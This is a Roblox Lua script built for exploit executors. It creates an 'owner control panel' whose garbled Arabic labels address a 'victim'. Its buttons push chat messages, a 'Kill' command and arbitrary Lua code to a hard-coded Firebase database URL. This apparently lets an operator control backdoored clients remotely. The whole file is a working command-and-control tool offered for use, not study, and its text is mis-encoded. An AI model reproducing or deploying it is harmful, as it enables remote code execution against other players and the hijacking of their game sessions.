local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS         = game:GetService("UserInputService")

local firebaseUrl = "https://tast1-e066a-default-rtdb.asia-southeast1.firebasedatabase.app/command.json"
local http_request = syn and syn.request or http_request or http.request or request

-- Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± Ø¥Ù„Ù‰ Firebase
local function sendCommand(command)
    local ok, res = pcall(function()
        return http_request({
            Url = firebaseUrl,
            Method = "PUT",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(command),
        })
    end)
    if not ok or not res or (res.StatusCode < 200 or res.StatusCode >= 300) then
        warn("âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…Ø±:", res and res.StatusCode or "Error")
    else
        warn("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…Ø±:", command)
    end
end

-- ÙˆØ§Ø¬Ù‡Ø© GUI
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 320, 0, 320)
Frame.Position = UDim2.new(0.5, -160, 0.5, -160)
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ù…Ø§Ù„Ùƒ"
Title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextScaled = true

local MessageBox = Instance.new("TextBox", Frame)
MessageBox.Size = UDim2.new(0.9, 0, 0.1, 0)
MessageBox.Position = UDim2.new(0.05, 0, 0.15, 0)
MessageBox.PlaceholderText = "Ø§ÙƒØªØ¨ Ø±Ø³Ø§Ù„Ø© Ù„Ù„Ø¶Ø­ÙŠØ©"
MessageBox.ClearTextOnFocus = false
MessageBox.Text = ""

local SendButton = Instance.new("TextButton", Frame)
SendButton.Size = UDim2.new(0.9, 0, 0.1, 0)
SendButton.Position = UDim2.new(0.05, 0, 0.27, 0)
SendButton.Text = "ğŸ“© Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø©"
SendButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
SendButton.TextColor3 = Color3.new(1, 1, 1)

local KillButton = Instance.new("TextButton", Frame)
KillButton.Size = UDim2.new(0.9, 0, 0.1, 0)
KillButton.Position = UDim2.new(0.05, 0, 0.4, 0)
KillButton.Text = "â˜ ï¸ Ù‚ØªÙ„ Ø§Ù„Ø¶Ø­ÙŠØ©"
KillButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
KillButton.TextColor3 = Color3.new(1, 1, 1)

local ScriptBox = Instance.new("TextBox", Frame)
ScriptBox.Size = UDim2.new(0.9, 0, 0.2, 0)
ScriptBox.Position = UDim2.new(0.05, 0, 0.55, 0)
ScriptBox.PlaceholderText = "-- Ø§ÙƒØªØ¨ Ø³ÙƒØ±Ø¨Øª Lua Ù‡Ù†Ø§"
ScriptBox.ClearTextOnFocus = false
ScriptBox.MultiLine = true
ScriptBox.TextWrapped = true
ScriptBox.TextYAlignment = Enum.TextYAlignment.Top
ScriptBox.Text = ""

local RunButton = Instance.new("TextButton", Frame)
RunButton.Size = UDim2.new(0.9, 0, 0.1, 0)
RunButton.Position = UDim2.new(0.05, 0, 0.78, 0)
RunButton.Text = "ğŸ“œ ØªÙ†ÙÙŠØ° Ø³ÙƒØ±Ø¨Øª"
RunButton.BackgroundColor3 = Color3.fromRGB(100, 100, 200)
RunButton.TextColor3 = Color3.new(1, 1, 1)

-- Ø§Ù„Ø£ÙˆØ§Ù…Ø±
SendButton.MouseButton1Click:Connect(function()
    local text = MessageBox.Text
    if text ~= "" then
        sendCommand("Chat:" .. text)
        MessageBox.Text = ""
    end
end)

KillButton.MouseButton1Click:Connect(function()
    sendCommand("Kill")
end)

RunButton.MouseButton1Click:Connect(function()
    local code = ScriptBox.Text
    if code ~= "" then
        sendCommand("Run:" .. code)
    end
end)

-- Ø³Ø­Ø¨ Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© (ÙŠØ¯Ø¹Ù… Ø§Ù„Ù…Ø§ÙˆØ³ ÙˆØ§Ù„Ù„Ù…Ø³)
local dragging, dragStart, startPos

local function startDrag(input)
    dragging = true
    dragStart = input.Position
    startPos = Frame.Position
    input.Changed:Connect(function()
        if input.UserInputState == Enum.UserInputState.End then
            dragging = false
        end
    end)
end

local function updateDrag(input)
    if dragging then
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        startDrag(input)
    end
end)

Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        updateDrag(input)
    end
end)

UIS.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        updateDrag(input)
    end
end)
